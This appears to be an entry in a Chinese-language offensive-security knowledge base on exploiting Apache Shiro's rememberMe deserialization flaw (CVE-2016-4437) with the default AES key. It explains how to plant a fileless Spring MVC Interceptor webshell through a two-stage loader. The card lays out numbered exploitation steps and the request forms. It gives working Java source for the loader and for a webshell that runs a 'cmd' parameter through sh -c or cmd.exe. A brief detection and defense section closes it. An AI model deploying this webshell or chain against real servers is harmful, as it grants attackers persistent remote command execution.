---
id: web-java-framework-shiro-rememberme-spring-interceptor-memshell-classdata
title: Shiro rememberMe 反序列化 + Spring RequestContextHolder 两段式投递 Interceptor 内存马
type: scenario
domain: web
path: web/java/framework/shiro
technique: shiro-rememberme-spring-interceptor-classdata-loader
aliases:
- Shiro 打 Spring 内存马
- classData 两段式加载
- RequestContextHolder 取当前请求
- Shiro 反序列化注入 Spring Interceptor
- AbstractTranslet 加载器
- defineClass 后 newInstance 注入内存马
tags:
- java
- shiro
- spring
- spring-mvc
- rememberme
- deserialization
- memshell
- interceptor
- defineclass
- templatesimpl
- cve-2016-4437
cve:
- CVE-2016-4437
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-13'
verification:
  verified_by: verifier-V653-fix
  verified_at: '2026-11-13T05:46:17+08:00'
  notes: 依 12505 复验结论统一修正反序列化入口表述：DefaultSerializer 用 ClassResolvingObjectInputStream（ClassLoader.loadClass，数组链受类加载器可见性限制）而非 new ObjectInputStream；CB1 链为非数组形态不受影响；其余内容未动。
---

## 一句话结论

在 Shiro 使用默认/已知 AES 密钥、且应用为 Spring MVC + Tomcat 的环境中，rememberMe 反序列化可先加载一个体积很小的 `AbstractTranslet` 加载器；该加载器在静态块中通过 Spring `RequestContextHolder` 取得当前请求，从 POST 参数 `classData` 读取 Base64 字节码，经 `ClassLoader.defineClass` 定义并 `newInstance()` 实例化真正的恶意类，恶意类再把自己反射加入 `AbstractHandlerMapping.adaptedInterceptors`，从而在 Cookie 不超请求头长度限制的前提下形成不落文件、不新增路由的 Spring Interceptor 内存马。

## 原理

- **Shiro-550 基线**：`rememberMe` Cookie 为 `Base64(16 字节 IV + AES-CBC(Java 序列化数据))`，服务端用固定密钥解密后交给 `DefaultSerializer.deserialize()`，即 `ClassResolvingObjectInputStream` 的 `readObject()`（经 `ClassLoader.loadClass` 解析类名，数组类型链受类加载器可见性限制）。攻击者用默认密钥 `kPH+bIxk5D2deZiIxcaaaA==` 自行加密一条 CB1 链（`PriorityQueue.readObject → BeanComparator.compare → PropertyUtils.getProperty(o,"outputProperties") → TemplatesImpl.getOutputProperties → newTransformer`），即可在 `TemplatesImpl._bytecodes` 中执行任意 `AbstractTranslet` 子类的静态块。
- **为什么要两段式**：`rememberMe` 是 Cookie，属于请求头；Tomcat 的 `maxHttpHeaderSize` 默认约 8KB。把完整的 Spring Interceptor 内存马类（还带 Spring 反射代码与命令执行逻辑）编译后 Base64 放进 Cookie，会直接触发 400 Bad Request。请求体不受该限制，因此把大体积类字节码移到 POST 参数，Cookie 里只保留一个仅含“取请求 + 读参数 + defineClass”逻辑的小加载器。
- **没有全局 request 变量时如何取当前请求**：加载器由 `TemplatesImpl` 在反序列化线程中实例化，此时没有 Servlet 方法参数。它调用 `RequestContextHolder.getRequestAttributes()` 取 `ServletRequestAttributes`，再 `getRequest()` 得到 `HttpServletRequest`（Tomcat 下实际是 `RequestFacade`）；反射 `RequestFacade` 的私有字段 `request` 取得 `org.apache.catalina.connector.Request`，继而 `getResponse()` 与 `getSession()`。这条路径依赖 `RequestContextHolder` 在 Shiro 过滤器之前已被 `RequestContextListener`/`RequestContextFilter`（或更早的 Servlet 环节）填充，否则取到 null。
- **classData 必须 URL 编码**：POST 表单编码会把 Base64 中的 `+` 解码成空格，导致 `BASE64Decoder` 解出错误字节；因此 `classData` 要先做 URL 编码再放入 body。
- **类加载与初始化**：`ClassLoader.defineClass(byte[],int,int)` 是 protected 方法，需反射 `setAccessible(true)` 后用加载器自身的 ClassLoader 调用；`defineClass` 只定义类，`newInstance()` 才触发类初始化，从而执行恶意类的静态块。原文随后调用 `cc.newInstance().equals(new Object[]{request,response,session})`，若恶意类重写了 `equals(Object)`，可借此把当前请求上下文传入；对静态块已完成注入的类而言，`newInstance()` 本身就足够。
- **Interceptor 注入为什么生效**：Spring MVC 的 `DispatcherServlet.doDispatch → AbstractHandlerMapping.getHandler → getHandlerExecutionChain` 会遍历 `adaptedInterceptors`，把匹配的拦截器加入执行链；运行期反射拿到该 `ArrayList` 后 `add` 一个恶意 `HandlerInterceptor`，下一个请求进入 Controller 之前就会执行其 `preHandle`。因为不新增路由、不写文件，网关按既有业务路径放行也不影响内存马触发。
- **命令执行**：恶意 `preHandle` 读取 `cmd` 参数，按操作系统用 `sh -c` 或 `cmd.exe /c` 执行并回写响应，存在 `cmd` 时返回 `false` 阻断后续业务处理。

## 触发条件

- 目标 Shiro 使用默认或已知的 rememberMe AES 密钥，且 classpath 中存在可用的 CB1/TemplatesImpl 利用链（commons-beanutils 等）。
- 应用为 Spring MVC（非 WebFlux）且容器为 Tomcat：加载器依赖 `RequestFacade` 的 `request` 字段与 `org.apache.catalina.connector.Request#getResponse()`；不同容器/版本字段名可能不同。
- `RequestContextHolder` 在 Shiro 过滤器执行前已被填充（注册了 `RequestContextListener` 或 `RequestContextFilter` 且顺序早于 Shiro，或请求已进入 DispatcherServlet 相关处理）；否则加载器取不到当前请求。
- 攻击者可发送同时带 `rememberMe` Cookie 与 POST body 的请求，body 未被 WAF 按大小或内容关键字阻断。
- 加载器与最终内存马类的字节码与目标 JDK 兼容（如使用 `sun.misc.BASE64Decoder` 时需 JDK8 或对应模块可访问）；Spring 版本中目标字段仍为 `adaptedInterceptors`。

## 利用步骤

1. 编写并编译加载器类：继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，在静态块中取 `RequestContextHolder` → `ServletRequestAttributes` → `HttpServletRequest`，反射 `request` 字段得到 Tomcat `Request`/`Response`，读取 `classData` 并 Base64 解码。
2. 编写并编译最终恶意类（实现 `HandlerInterceptor`），静态块中取 `WebApplicationContext`、`RequestMappingHandlerMapping`，反射 `AbstractHandlerMapping.adaptedInterceptors` 并 `add(new 恶意拦截器())`；`preHandle` 执行 `cmd` 参数。
3. 用 CB1 链把加载器字节码放入 `TemplatesImpl._bytecodes`，用默认密钥 AES 加密后 Base64，作为 `Cookie: rememberMe=...` 发送；Cookie 体积保持在请求头限制内。
4. 同一请求的 POST body 放 `classData=<URL 编码后的最终类 Base64>`。
5. 服务端反序列化触发加载器静态块：从 `classData` 解码字节码，`ClassLoader.defineClass` 定义并通过 `newInstance()` 初始化最终类；最终类静态块把拦截器加入 `adaptedInterceptors`。
6. 访问任意业务路径并附带 `?cmd=whoami`，响应返回命令输出，说明内存马已生效；重启应用后失效。

## PoC

加载器关键逻辑（省略 `transform` 空实现）：

```java
public class Evil extends AbstractTranslet {
    static {
        try {
            HttpServletRequest request = ((ServletRequestAttributes)
                RequestContextHolder.getRequestAttributes()).getRequest();
            java.lang.reflect.Field r = request.getClass().getDeclaredField("request");
            r.setAccessible(true);
            org.apache.catalina.connector.Response response =
                ((org.apache.catalina.connector.Request) r.get(request)).getResponse();
            HttpSession session = request.getSession();

            String classData = request.getParameter("classData");
            if (classData != null && !classData.isEmpty()) {
                byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
                Method m = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, int.class, int.class);
                m.setAccessible(true);
                Class cc = (Class) m.invoke(Evil.class.getClassLoader(), classBytes, 0, classBytes.length);
                cc.newInstance().equals(new Object[]{request, response, session});
            }
        } catch (Exception e) { e.printStackTrace(); }
    }
    @Override public void transform(DOM d, SerializationHandler[] h) {}
    @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) {}
}
```

最终内存马类静态块关键逻辑：

```java
public class calc implements HandlerInterceptor {
    static {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder
                .currentRequestAttributes()
                .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mapping =
                context.getBean("requestMappingHandlerMapping", RequestMappingHandlerMapping.class);
            Field f = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            f.setAccessible(true);
            ((List<HandlerInterceptor>) f.get(mapping)).add(new calc());
        } catch (Exception e) { e.printStackTrace(); }
    }
    public boolean preHandle(HttpServletRequest req, HttpServletResponse resp, Object h) throws Exception {
        String cmd = req.getParameter("cmd");
        if (cmd == null) return true;
        boolean win = System.getProperty("os.name").toLowerCase().contains("win");
        Process p = Runtime.getRuntime().exec(win ? new String[]{"cmd.exe","/c",cmd}
                                                  : new String[]{"sh","-c",cmd});
        Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
        resp.getWriter().write(s.hasNext() ? s.next() : "");
        resp.getWriter().flush();
        return false;
    }
}
```

请求形态：

```http
POST /login HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Cookie: rememberMe=<CB1 链加密加载器的 Base64，小于请求头限制>

classData=<URL 编码后的 calc.class Base64>
```

之后访问：

```http
GET /?cmd=whoami HTTP/1.1
```

## 变体与关联

- **与 TomcatEcho 两段式加载卡的区别**：[[web-java-framework-shiro-rememberme-two-stage-memshell-loader]] 用 TomcatEcho 反射链从线程上下文取 `org.apache.catalina.connector.Request`，参数名为 `code`，最终注入 Tomcat Filter 内存马；本卡用 Spring `RequestContextHolder` 取请求，参数名为 `classData`，最终注入 Spring Interceptor 内存马，适用于 Shiro 与 Spring MVC 同栈、且 `RequestContextHolder` 已填充的场景。
- **取请求的替代路径**：`RequestContextUtils.getWebApplicationContext(request)`、`WebApplicationContextUtils.getWebApplicationContext(servletContext)`；若 `RequestContextHolder` 为空，回退到 TomcatEcho 链或其他线程/上下文取 Request 的方式。
- **最终内存马类型变体**：同一加载器可投递 Filter/Servlet/Listener/Valve 或 Spring Controller 内存马，参见 [[web-java-framework-spring-mvc-interceptor-memshell]]、[[web-java-framework-spring-mvc-dynamic-controller-memshell]]、[[web-java-component-tomcat-dynamic-filter-memshell]]。
- **CB1 链与 Shiro-550 基线**：链构造见 [[web-java-deser-commonsbeanutils-cb1-beancomparator-priorityqueue]]，密钥与 rememberMe 格式见 [[web-java-framework-shiro-550-hardcoded-key-deserialization]]。
- **`equals` 传参约定**：原文用 `newInstance().equals(new Object[]{request,response,session})` 把上下文递给被加载类；若类未重写 `equals`，这次调用只是普通对象比较，真正起作用的是 `newInstance()` 触发的静态块。

## 检测与防御

- 升级 Shiro、轮换/随机化 rememberMe AES 密钥，禁用不必要的 rememberMe；对反序列化入口启用 `ObjectInputFilter`/JEP 290 类白名单。
- 监控同一请求同时出现 `rememberMe` Cookie 与超长 Base64 的 `classData`/`code` 表单参数；对 URL 编码超长 body、异常 Base64 直接阻断或告警。
- RASP/字节码监控：`ClassLoader#defineClass` 反射调用、`TemplatesImpl.newTransformer`、`AbstractHandlerMapping.adaptedInterceptors.add`、`RequestContextHolder.getRequestAttributes` 出现在非业务类中。
- 运行期排查：枚举各 `HandlerMapping` 的 `adaptedInterceptors`，检查非业务包、匿名类或随机类名的拦截器；重启应用可清除内存马，但需先修复反序列化入口。
